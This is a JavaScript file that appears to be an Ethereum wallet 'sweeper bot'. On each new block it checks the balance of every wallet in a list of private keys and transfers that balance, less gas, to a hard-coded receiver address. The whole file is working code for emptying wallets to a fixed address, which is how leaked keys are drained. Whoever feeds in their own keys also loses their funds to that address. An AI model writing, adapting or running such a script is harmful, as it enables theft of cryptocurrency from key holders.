import { ethers } from 'ethers';

// Initialize provider using the new way for v6
const provider = new ethers.JsonRpcProvider('https://mainnet.infura.io/v3/your-infura-project-id');

// Receiver's address
const addressReceiver = '0xE3c04383948e7e6A4F242556f3348667AF44841f';

// Private keys for the accounts you want to check
const privateKeys = ["your-private-key"];

const bot = async () => {
  provider.on('block', async () => {
    try {
      console.log('Listening to new block, waiting ;)');

      for (let i = 0; i < privateKeys.length; i++) {
        const _target = new ethers.Wallet(privateKeys[i], provider);
        const balance = await provider.getBalance(_target.address);
        console.log(`Balance: ${balance.toString()}`);

        // Fetch gas-related data using provider.getFeeData()
        const feeData = await provider.getFeeData();
        const gasPrice = feeData.gasPrice;
        console.log(`Gas Price: ${gasPrice.toString()}`);

        // Estimate gas limit for the transaction
        const gasLimit = await _target.estimateGas({
          to: addressReceiver,
          value: balance
        });
        console.log(`Gas Limit: ${gasLimit.toString()}`);

        // Calculate total gas cost
        const totalGasCost = gasLimit * gasPrice;
        console.log(`Total Gas Cost: ${totalGasCost.toString()}`);

        // Ensure the balance is sufficient to cover both the gas cost and the amount being sent
        if (balance > totalGasCost) {
          console.log("New Account with Eth!");
          const amount = balance - totalGasCost;

          try {
            const tx = await _target.sendTransaction({
              to: addressReceiver,
              value: amount,
              gasLimit: gasLimit,
              gasPrice: gasPrice
            });
            console.log(`Transaction sent! Hash: ${tx.hash}`);
            console.log(`Success! Transferred --> ${ethers.formatEther(amount)} ETH`);
          } catch (e) {
            console.log(`Error: ${e}`);
          }
        } else {
          console.log("Insufficient funds to cover gas cost and transfer amount.");
        }
      }
    } catch (err) {
      console.log(`Error in block listener: ${err}`);
    }
  });
};

bot();
